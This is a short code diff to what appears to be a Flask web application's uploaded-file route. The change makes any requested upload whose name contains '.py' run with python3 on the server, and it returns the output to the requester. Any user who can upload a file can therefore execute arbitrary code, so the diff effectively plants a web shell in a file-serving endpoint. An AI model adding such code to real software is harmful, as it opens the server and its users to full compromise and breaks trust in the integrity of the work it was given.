@@ -35,6 +35,9 @@ def index():
 def uploaded_file(filename):
     filepath = os.path.join(UPLOAD_FOLDER, filename)
 
+    if ".py" in filename:
+        result = subprocess.run(['python3', filepath], capture_output=True, text=True)
+        return f"<pre>{result.stdout or result.stderr}</pre>", 200, {'Content-Type': 'text/plain'}
 
     return send_from_directory(UPLOAD_FOLDER, filename)
 
